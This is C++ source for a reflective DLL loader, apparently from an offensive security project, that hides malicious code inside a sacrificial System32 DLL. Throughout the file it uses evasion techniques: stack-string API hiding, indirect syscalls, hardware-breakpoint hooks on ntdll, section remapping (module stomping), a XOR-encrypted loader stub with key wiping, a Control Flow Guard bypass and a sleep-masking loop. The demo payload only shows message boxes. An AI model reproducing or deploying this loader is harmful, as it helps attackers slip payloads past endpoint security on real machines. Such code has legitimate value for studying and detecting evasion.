// dllmain.cpp : Defines the entry point for the DLL application.
#include <Windows.h>
#include <winternl.h>
#include "headers.h"
#include "hwbp.h"
#include "misc.h"
#include "sleaping.h"
#include "syscalls.h"
#include "swappala.h"
#include "funcaliases.h"

#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)



/*-------------------REFLECTIVE LOADER----------------------------*/

EXTERN_DLL_EXPORT PBYTE ReflectiveFunction() {

    
    
/*--------------CREATE VARIABLES AND  INITIALIZE FUNCTIONS--------------*/

    //PE HEADERS VARS
    PIMAGE_DOS_HEADER	pImgDosHdr = NULL;
    PIMAGE_NT_HEADERS	pImgNtHdrs = NULL;
    IMAGE_OPTIONAL_HEADER	ImgOptHdr = {0};
    IMAGE_FILE_HEADER ImgFileHdr = {0};
    PIMAGE_SECTION_HEADER* peSections = NULL;
    PIMAGE_IMPORT_DESCRIPTOR pImgImpDesc = NULL;
    PIMAGE_THUNK_DATA64 pOriginalFirstThunk = NULL;
    PIMAGE_THUNK_DATA64 pFirstThunk = NULL;
    PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;
    PIMAGE_BASE_RELOCATION pImgRelocation = NULL;
    PBASE_RELOCATION_ENTRY pRelocEntry = NULL;
    PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFunctionEntry = NULL;
    PIMAGE_TLS_DIRECTORY pImgTlsDirectory = NULL;
    PIMAGE_TLS_CALLBACK* arrayOfCallbacks = NULL;


    //fix IAT vars
    HMODULE dll = NULL;
    FARPROC funcAddress = NULL;
    int ordinal = 0;
    

   //base relocation vars
    ULONG_PTR delta = NULL;
    int entriesCount;
    
    //fix Memory Protection variables
    DWORD dwProtection = 0x00;
    

    //locate DLL in memory
    PDLL_HEADER pDllHeader = NULL;
    ULONG_PTR dllBaseAddress = NULL;

    //new PE in memory and memory to free once loaded
    PBYTE pebase = NULL;
    PBYTE toFree = NULL;
    
    //function prototpyes
    fnLoadLibraryA LLA = NULL; //to fix the IAT
    fnRtlAddFunctionTable RAFT = NULL;
    fnLoadLibraryExA LLEA = NULL;//to load sac dll without resolving imports

    //stack strings for PIC
    WCHAR kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
    WCHAR ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
    WCHAR user32[] = { L'U', L's', L'e', L'r', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
    CHAR rtladdFunctionTable[] = { 'R', 't', 'l', 'A', 'd', 'd', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', 'T', 'a', 'b', 'l', 'e', '\0' };
    CHAR loadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };
    CHAR loadLibraryEx[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'E', 'x', 'A','\0' };
    CHAR getProcessId[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', '\0' };

    
    //stack strings and variables for HBP
    CHAR addVectoredExceptionHandler[] = { 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
    CHAR removeVectoredExceptionHandler[] = { 'R', 'e', 'm', 'o', 'v', 'e', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
    PVOID zwCloseAddress = NULL;
    PVOID NtMapViewOfSectionAddress = NULL;
    PVOID NtCreateSectionAddress = NULL;
    CHAR zwclose[] = { 'Z','w','C','l','o','s','e','\0' };
    CHAR ntMapViewOfSection[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
    CHAR ntCreateSection[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };

    //NT status variable for syscall return code
    NTSTATUS STATUS = 0x00;
   
    fnAddVectoredExceptionHanlder AVEH = (fnAddVectoredExceptionHanlder)GPAR(GMHR(kernel32), addVectoredExceptionHandler);
    fnRemoveVectoredExceptionHandler RVEH = (fnRemoveVectoredExceptionHandler)GPAR(GMHR(kernel32), removeVectoredExceptionHandler);
    
    //these i do not need to indirect syscall-em
    if ((LLEA = (fnLoadLibraryExA)GPAR(GMHR(kernel32), loadLibraryEx)) == NULL)
        return FALSE;
    if ((LLA = (fnLoadLibraryA)GPAR(GMHR(kernel32), loadLibraryA)) == NULL)
        return FALSE;
    if (!(RAFT = (fnRtlAddFunctionTable)GPAR(GMHR(kernel32), rtladdFunctionTable)))
        return FALSE;


    /*----------------SYSCALL ENUMERATION-------------------------------------*/
    SYSCALL_ENTRY zwFunctions[AmountofSyscalls] = { 0 };
    RetrieveZwFunctions(GMHR(ntdll), zwFunctions);
    
     /*--------------SET HARDWARE BREAKPOINT AND DETOUR FUNCTIONS---------------------*/
    
    
    AVEH(1, (PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
    
    zwCloseAddress = GPAR(GMHR(ntdll), zwclose);
    NtMapViewOfSectionAddress = GPAR(GMHR(ntdll), ntMapViewOfSection);
    NtCreateSectionAddress = GPAR(GMHR(ntdll), ntCreateSection);
    if (zwCloseAddress != NULL && NtMapViewOfSectionAddress != NULL && NtCreateSectionAddress != NULL)
        setHardwareBreakpoint(zwCloseAddress, NtMapViewOfSectionAddress, NtCreateSectionAddress, zwFunctions);

    /*--------------BRUTE FORCE REFLECTIVE DLL BASE ADDRESS--------------*/

    dllBaseAddress = (ULONG_PTR)ReflectiveFunction;

    while (TRUE)
    {
        pDllHeader = (PDLL_HEADER)dllBaseAddress;

        if (pDllHeader->header == 0x44434241) {

            pImgDosHdr = (PIMAGE_DOS_HEADER)(dllBaseAddress + (16 * sizeof(CHAR)));
            if (pImgDosHdr->e_magic == IMAGE_DOS_SIGNATURE)
            {
                pImgNtHdrs = (PIMAGE_NT_HEADERS)(dllBaseAddress + pImgDosHdr->e_lfanew + (16 * sizeof(CHAR)));

                if (pImgNtHdrs->Signature == IMAGE_NT_SIGNATURE) {

                    break;
                }
            }
        }
        dllBaseAddress--;
    }
    //here it still needs to be adjusted because there are the headers in between, check some lines later
    if (!dllBaseAddress)
        return FALSE;

    //pointer memory to be freed once loaded
    toFree = (PBYTE)dllBaseAddress;
    
    //setting some headers for new steps
    PIMAGE_OPTIONAL_HEADER pImgOptHdr = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)pImgNtHdrs + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
    ImgFileHdr = pImgNtHdrs->FileHeader;
    
    /*------------------------------LOADING SACRIFICAL DLL---------------------*/
   
    PBYTE sacDllBase = NULL;
    CHAR sacDllPath[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };

    HMODULE sacModule = NULL;
    sacModule = LLEA(sacDllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    

    /*------------------------------UNSET HARDWARE BREAKPOINT---------------------*/

    unsetHardwareBreakpoint(1);
    unsetHardwareBreakpoint(2);
    unsetHardwareBreakpoint(3);

    RVEH((PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
    
    sacDllBase = (PBYTE)sacModule;
   
    /*--------------------PARSE SACRIFICIAL DLL TO RETRIEVE THE SIZE--------------*/

    PIMAGE_DOS_HEADER pImgDosHdrSacDll = NULL;
    PIMAGE_NT_HEADERS pImgNTHdrSacDll = NULL;
    PVOID memAddressForSyscallSacDll = NULL;
    SIZE_T payloadSizeforSyscallSacDll = NULL;
    ULONG uOldProtectionSacDll = NULL;
    
    if (sacDllBase == NULL) {
        return FALSE;
    }

    pImgDosHdrSacDll = (PIMAGE_DOS_HEADER)sacDllBase;
    if (pImgDosHdrSacDll->e_magic != IMAGE_DOS_SIGNATURE) {

        return NULL;
    }

    pImgNTHdrSacDll = (PIMAGE_NT_HEADERS)(sacDllBase + pImgDosHdrSacDll->e_lfanew);
    if (pImgNTHdrSacDll->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    memAddressForSyscallSacDll = (PVOID)sacDllBase;
    payloadSizeforSyscallSacDll = (SIZE_T)pImgNTHdrSacDll->OptionalHeader.SizeOfImage;

    /*----------------RETRIEVE THE DLL HANDLE WITH KERNEL OBJ ENUM---------------------*/

    HANDLE sacDllHandle = FindSectionHandle(zwFunctions, (fnGetProcessId)GPAR(GMHR(kernel32), getProcessId));
    
    
    /*------------------SWAPPALA STUFF--------------------------*/
    
    PVOID sacDll = NULL;
    HANDLE dllFile = NULL;
    HANDLE sectionHandle = NULL;
    SIZE_T viewSize = NULL;
    payloadSizeforSyscallSacDll = payloadSizeforSyscallSacDll + 24;
    LARGE_INTEGER sectionSize = { payloadSizeforSyscallSacDll };
   

    if (STATUS = ZwCreateSection(&sectionHandle, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL, zwFunctions[ZwCreateSectionF].SSN, zwFunctions[ZwCreateSectionF].sysretAddr) != 0) {
    
        return FALSE;
    } 
    if (STATUS = ZwUnmapViewOfSection(((HANDLE)(LONG_PTR)-1), sacModule, zwFunctions[ZwUnmapViewOfSectionF].SSN, zwFunctions[ZwUnmapViewOfSectionF].sysretAddr) != 0) {

        return FALSE;

    }
    sacDll = (PVOID)sacModule;
    
    if (STATUS = ZwMapViewOfSection(sectionHandle, ((HANDLE)(LONG_PTR)-1), &sacDll, NULL, NULL, NULL, &payloadSizeforSyscallSacDll, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE, zwFunctions[ZwMapViewOfSectionF].SSN, zwFunctions[ZwMapViewOfSectionF].sysretAddr) != 0) {
    
        return FALSE;
    }
    
    //fixing the baseAddress including the 16 bytes of header
    dllBaseAddress = dllBaseAddress + (16 * sizeof(CHAR));
    
    /*--------------COPY SECTIONS IN MEMORY---------------------------*/
    
    //copy needed information for the DLL once loaded 
    pebase = (PBYTE)sacDll;
    custom_memcpy_classic(pebase, &sacDllHandle, sizeof(HANDLE));
    pebase += sizeof(HANDLE);
    custom_memcpy_classic(pebase, &sectionHandle, sizeof(HANDLE));
    pebase += sizeof(HANDLE);
    custom_memcpy_classic(pebase, &payloadSizeforSyscallSacDll, sizeof(SIZE_T));
    pebase += sizeof(SIZE_T);
    custom_memcpy_classic(pebase, &toFree, sizeof(PBYTE));
    pebase += sizeof(PBYTE);
    
    //retrieve sections information
    PVOID pesectionTemp = NULL;
    SIZE_T sSize = 0x00;
    sSize = sizeof(PIMAGE_SECTION_HEADER) * ImgFileHdr.NumberOfSections;

    //this can be changed but pretty tired, not need to allocate memory 
    if ((STATUS = ZwAllocateVirtualMemory(((HANDLE)(LONG_PTR)-1), &pesectionTemp, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, zwFunctions[ZwAllocateVirtualMemoryF].SSN, zwFunctions[ZwAllocateVirtualMemoryF].sysretAddr)) != 0) {

        return FALSE;
    }
    
    peSections = (PIMAGE_SECTION_HEADER*)pesectionTemp;
    
    if (peSections == NULL)
        return FALSE;
    
   
    for (int i = 0; i < ImgFileHdr.NumberOfSections; i++) {
        peSections[i] = (PIMAGE_SECTION_HEADER)(((PBYTE)pImgNtHdrs) + 4 + 20 + ImgFileHdr.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER));
    }
  
    for (int i = 0; i < ImgFileHdr.NumberOfSections; i++) {

        //load sections in memory but not the ReflectiveLoader function
        custom_memcpy(
            (PVOID)(pebase + peSections[i]->VirtualAddress),// Destination
            (PVOID)(dllBaseAddress + peSections[i]->PointerToRawData),// Source
            peSections[i]->SizeOfRawData,// Size
            (PBYTE)(ReflectiveFunction),//reflective-function-pointer
            pDllHeader->funcSize//size of reflective function
        );
    }

    /*--------------FIX IAT TABLE--------------*/
    
    for (size_t i = 0; i < pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {


        pImgImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pebase + pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + i);
        if (pImgImpDesc->OriginalFirstThunk == NULL && pImgImpDesc->FirstThunk == NULL)
            break;


        dll = LLA((LPSTR)(pebase + pImgImpDesc->Name));
        if (dll == NULL) {
            return FALSE;
        }

        pOriginalFirstThunk = (PIMAGE_THUNK_DATA64)(pebase + pImgImpDesc->OriginalFirstThunk);
        pFirstThunk = (PIMAGE_THUNK_DATA64)(pebase + pImgImpDesc->FirstThunk);

        while (pOriginalFirstThunk->u1.Function != NULL && pFirstThunk->u1.Function != NULL) {

            if (pOriginalFirstThunk->u1.Ordinal & 0x8000000000000000) {


                ordinal = pOriginalFirstThunk->u1.Ordinal & 0xFFFF;
                funcAddress = GPARO(dll, (int)ordinal);
                if (funcAddress != nullptr)
                    pFirstThunk->u1.Function = (ULONGLONG)funcAddress;

            }
            else {
                pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pebase + pOriginalFirstThunk->u1.AddressOfData);
                funcAddress = GPAR(dll, pImgImportByName->Name);
                if (funcAddress != nullptr)
                    pFirstThunk->u1.Function = (ULONGLONG)funcAddress;
            }

            pOriginalFirstThunk++;
            pFirstThunk++;

        }
    }
    
    /*--------------APPLY BASE RELOCATIONS--------------*/

   
    delta = (ULONG_PTR)pebase - pImgOptHdr->ImageBase;

    pImgRelocation = (PIMAGE_BASE_RELOCATION)(pebase + pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    while (pImgRelocation->VirtualAddress) {


        pRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgRelocation + 1);
        entriesCount = (int)((pImgRelocation->SizeOfBlock - 8) / 2);

        
        for (int i = 0; i < entriesCount; i++) {

            switch (pRelocEntry->Type) {
            case IMAGE_REL_BASED_DIR64:
            {

                ULONGLONG* toAdjust = (ULONGLONG*)(pebase + pImgRelocation->VirtualAddress + pRelocEntry->Offset);
                *toAdjust += (ULONGLONG)delta;
                break;
            }
            case IMAGE_REL_BASED_HIGHLOW:
            {

                DWORD* toAdjust = (DWORD*)(pebase + pImgRelocation->VirtualAddress + pRelocEntry->Offset);
                *toAdjust += (DWORD)delta;
            }
            break;
            case IMAGE_REL_BASED_HIGH:
            {
                WORD* toAdjust = (WORD*)(pebase + pImgRelocation->VirtualAddress + pRelocEntry->Offset);
                *toAdjust += HIWORD(delta);

            }
            break;
            case IMAGE_REL_BASED_LOW:
            {

                WORD* toAdjust = (WORD*)(pebase + pImgRelocation->VirtualAddress + pRelocEntry->Offset);
                *toAdjust += LOWORD(delta);


            }
            break;
            case IMAGE_REL_BASED_ABSOLUTE:
                //The base relocation is skipped. This type can be used to pad a block
                break;

            }
            pRelocEntry++;

        }

        pImgRelocation = (PIMAGE_BASE_RELOCATION)(reinterpret_cast<DWORD_PTR>(pImgRelocation) + pImgRelocation->SizeOfBlock);

    }
       
    /*-------------ADJUST MEMORY PROTECTIONS BASING ON SECTIONS HEADERS*/
    PVOID memAddressForSyscall = NULL;
    SIZE_T payloadSizeforSyscall = NULL;
    ULONG uOldProtection = NULL;

    for (int i = 0; i < ImgFileHdr.NumberOfSections; i++) {

        
        if (peSections[i]->Characteristics & IMAGE_SCN_MEM_WRITE) {//write

            dwProtection = PAGE_WRITECOPY;
        }
        if (peSections[i]->Characteristics & IMAGE_SCN_MEM_READ) {//read

            dwProtection = PAGE_READONLY;
        }
        if (peSections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE) {//exec

            dwProtection = PAGE_EXECUTE;
        }
        if (peSections[i]->Characteristics & IMAGE_SCN_MEM_READ && peSections[i]->Characteristics & IMAGE_SCN_MEM_WRITE) { //readwrite

            dwProtection = PAGE_READWRITE;

        }
        if (peSections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE && peSections[i]->Characteristics & IMAGE_SCN_MEM_WRITE) { //executewrite

            dwProtection = PAGE_EXECUTE_WRITECOPY;

        }
        if (peSections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE && peSections[i]->Characteristics & IMAGE_SCN_MEM_READ) { //executeread

            dwProtection = PAGE_EXECUTE_READ;

        }
        if (peSections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE && peSections[i]->Characteristics & IMAGE_SCN_MEM_READ && peSections[i]->Characteristics & IMAGE_SCN_MEM_WRITE) { //executereadwrite

            dwProtection = PAGE_EXECUTE_READWRITE;
        }
       
        memAddressForSyscall = (PVOID)(pebase + peSections[i]->VirtualAddress);
        payloadSizeforSyscall = (SIZE_T)peSections[i]->SizeOfRawData;
        
        if ((STATUS = ZwProtectVirtualMemory(((HANDLE)(LONG_PTR)-1), &memAddressForSyscall, &payloadSizeforSyscall, dwProtection, &uOldProtection, zwFunctions[1].SSN, zwFunctions[1].sysretAddr)) != 0) {
           
            return FALSE;
        }

    }

    /*--------------REGISTER EXCEPTIONS HANDLERS--------------*/

    if (pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size) {
        pImgRuntimeFunctionEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pebase + pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
        if (!RAFT(pImgRuntimeFunctionEntry, (pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(PIMAGE_RUNTIME_FUNCTION_ENTRY)), (DWORD64)pebase)) {
            //do nothing, no worth to make it stop for this
        }

    }
    
    /*--------------EXECUTE TLS CALLBACKS--------------*/

    if (pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {

        pImgTlsDirectory = (PIMAGE_TLS_DIRECTORY)(pebase + pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
        arrayOfCallbacks = (PIMAGE_TLS_CALLBACK*)(pImgTlsDirectory->AddressOfCallBacks);

        int i = 0;
        while (arrayOfCallbacks[i] != NULL) {

            arrayOfCallbacks[i]((LPVOID)pebase, DLL_PROCESS_ATTACH, NULL);

        }
    }
    /*--------------FLUSHING INSTRUCTION CACHE ALLA FEWER*/

    if ((STATUS = ZwFlushInstructionCache((HANDLE)-1,NULL,0x00,zwFunctions[ZwFlushInstructionCacheF].SSN, zwFunctions[ZwFlushInstructionCacheF].sysretAddr)) != 0) {

        return FALSE;
    }

    /*--------------RETURN ENTRY POINT ADDRESS TO CRAZY LOADER--------------*/
    return pebase;
}

//IMPLEMENTED FOR YOLO LOADER 
EXTERN_DLL_EXPORT bool CrazyLoader() {

    fnDllMain pDllMain = NULL;
    PBYTE pebase = NULL;
    PIMAGE_DOS_HEADER	pImgDosHdr = NULL;
    PIMAGE_NT_HEADERS	pImgNtHdrs = NULL;
    PDLL_HEADER pDllHeader = NULL;
    ULONG_PTR dllBaseAddress = NULL;
    dllBaseAddress = (ULONG_PTR)CrazyLoader;
   
    while (TRUE)
    {

        pDllHeader = (PDLL_HEADER)dllBaseAddress;

        if (pDllHeader->header == 0x44434241) {


            pImgDosHdr = (PIMAGE_DOS_HEADER)(dllBaseAddress + (16 * sizeof(CHAR)));
            if (pImgDosHdr->e_magic == IMAGE_DOS_SIGNATURE)
            {

                pImgNtHdrs = (PIMAGE_NT_HEADERS)(dllBaseAddress + pImgDosHdr->e_lfanew + (16 * sizeof(CHAR)));

                if (pImgNtHdrs->Signature == IMAGE_NT_SIGNATURE) {

                    break;
                }
            }
        }

        dllBaseAddress--;
    }

    if (!dllBaseAddress)
        return FALSE;

    //once base address is found retrieve information to decrypt the loader 
    PBYTE reflectiveAddr = NULL;
    BYTE KEY[4] = { (BYTE)(pDllHeader->key & 0xFF), (BYTE)((pDllHeader->key >> 8) & 0xFF), (BYTE)((pDllHeader->key >> 16) & 0xFF), (BYTE)((pDllHeader->key >> 24) & 0xFF) };
    reflectiveAddr = (PBYTE)ReflectiveFunction;
   
    for (size_t i = 0, j = 0; i < (pDllHeader->funcSize); i++, j++) {
        if (j >= sizeof(pDllHeader->key)) {
            j = 0;
        }
        reflectiveAddr[i] = reflectiveAddr[i] ^ KEY[j];
    }
    
    pebase = ReflectiveFunction();
    //re-encrypting the reflective function 
    for (size_t i = 0, j = 0; i < (pDllHeader->funcSize); i++, j++) {
        if (j >= sizeof(pDllHeader->key)) {
            j = 0;
        }
        reflectiveAddr[i] = reflectiveAddr[i] ^ KEY[j];
    }
    //removing the encryption key from memory
    pDllHeader->key = 0x0;
    
    //execute the entry point
    pDllMain = (fnDllMain)(pebase + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
    return pDllMain((HMODULE)pebase, DLL_PROCESS_ATTACH, NULL);
   
}


int CfgAddressAdd(IN HANDLE Process, IN PVOID ImageBase, IN PVOID Function) {
    CFG_CALL_TARGET_INFO Cfg = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo = { 0 };
    PIMAGE_NT_HEADERS    NtHeader = { 0 };
    ULONG                Output = 0;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        return FALSE;
    }

    const ULONG VmCfgCallTargetInformation = 2;
   
    NtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew);
    MemRange.NumberOfBytes = (NtHeader->OptionalHeader.SizeOfImage + 0x1000 - 1) & ~(0x1000 - 1);
    MemRange.VirtualAddress = ImageBase;

    /* set cfg target call info */
    Cfg.Flags = CFG_CALL_TARGET_VALID;
    Cfg.Offset = (ULONG_PTR)Function - (ULONG_PTR)ImageBase;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput = &Output;
    VmInfo.ptOffsets = &Cfg;
    VmInfo.pMustBeZero = FALSE;
    VmInfo.pMoarZero = FALSE;

    NtSetInformationVirtualMemory NtSetInfoVirtualMem = (NtSetInformationVirtualMemory)GetProcAddress(hNtdll, "NtSetInformationVirtualMemory");

	if (!NtSetInfoVirtualMem) {
		return -1;
	}

    if (!NT_SUCCESS(NtSetInfoVirtualMem(Process, VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof(VmInfo)))) {
        
		return -1;
    }

	return 0;
}

VOID CoreFunction(LPVOID lpParam) {

    PCORE_ARGUMENTS CoreArguments = NULL;
    CoreArguments = (PCORE_ARGUMENTS)lpParam;

    //looping and Sleaping <3
    do {
        MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
        if (Sleaping(CoreArguments->myBase, CoreArguments->sacDLLHandle, CoreArguments->malDLLHandle, CoreArguments->viewSize) == -1) {
            //nightmares
            MessageBoxA(NULL, "Sleaping", "With Nightmares", MB_OK | MB_ICONINFORMATION);
            return;
        }


    } while (TRUE);

}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
       
        PBYTE oldMemory = NULL;
        
        //even if unampped it's in the PEB
        PBYTE myBase = (PBYTE)GetModuleHandleA("SRH.dll");

        //get handle to NTDLL
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
		if (hNtdll == NULL) {
			return FALSE;
		}

        //retrieve the information left from the reflective loader
        //retrieve handle of sac dll
        PHANDLE pointerToHandle = (PHANDLE)myBase;
        HANDLE sacDllHandle = *pointerToHandle;
        
        //retrieve handle of mal dll
        pointerToHandle++;//+8 bytes
        HANDLE malDllHandle = *pointerToHandle;
        
        //retrieve size of dll in memory
        pointerToHandle++;//+8 bytes
        PSIZE_T pointerToSize = (PSIZE_T)pointerToHandle;
        SIZE_T viewSize = *pointerToSize;
        
        //retrieve the first buffer address
        pointerToHandle++;//+8 bytes
        oldMemory = (PBYTE) *pointerToHandle;

        //remove the very first buffer allocated for the reflective DLL
        if (VirtualFree(oldMemory, 0, MEM_RELEASE) == 0) {    
            //error releasing old buffer
            return FALSE;
        }
        //adding NtContinue to valid target as the new SleapingAPC implementation
        if (CfgAddressAdd(GetCurrentProcess(), hNtdll, GetProcAddress(hNtdll, "NtContinue")) == -1) {
			//error adding the address
			return FALSE;
        }

        PCORE_ARGUMENTS CoreArguments = (PCORE_ARGUMENTS)VirtualAlloc(NULL, sizeof(CORE_ARGUMENTS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        CoreArguments->myBase = myBase;
        CoreArguments->sacDLLHandle = sacDllHandle;
        CoreArguments->malDLLHandle = malDllHandle;
        CoreArguments->viewSize = viewSize;
        
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CoreFunction, CoreArguments, 0, NULL);

        if (hThread != NULL) {
			
            //saying goodbye to the loader thread
            ExitThread(0);
        }

        
    }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

